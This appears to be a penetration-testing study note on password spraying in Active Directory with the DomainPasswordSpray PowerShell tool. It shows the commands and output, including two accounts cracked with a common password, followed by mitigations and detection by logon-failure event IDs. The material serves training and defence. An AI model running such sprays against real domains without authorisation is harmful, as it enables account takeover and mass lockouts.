
If you have already access to account in `AD` so `DomainPasswordSpray` tools can easily get list of `Users` and password `lockout policy`. Some time client want to perform testing from `Windows host` but not authenticated to domain so we can manually provide list of users.

The host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us.
We supply `Password` flag with one single password and `-OutFile` flag to write output in file.  
```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```
### Mitigations
Several steps can be taken to mitigate this attack but not single solution. a defense-in-depth approach make pass spray attack difficult.

| Technique                                    | Description                                                                                                                                                                  |
| -------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Multi-factor Authentication`                | Multi-factor authentication can greatly reduce the risk of password spraying attacks. But if attacker get `username` and `password` so he can try it against other services. |
| `Restricting Access`                         | It is possible to log into application with any domain user. Only let people who actually need the application log in. Don’t allow every domain user by default.             |
| `Reducing Impact of Successful Exploitation` | Privileged user must have separate account for administrative tasks and network should be divided into `sunet` help to slow down the attackers.                              |
| `Password Hygiene`                           | Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack.                           |
If account lockout policy is too restricted and require administrative intervention to unlock the account so careless move can lockout many accounts in short time.

### Detection
In `DC` security logs many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) in short time indicate `pass spraying attack`. A more savvy attacker may avoid SMB password spraying and instead target LDAP.  So organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt.

This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing)  detecting password spraying using Windows Security Event Logging.
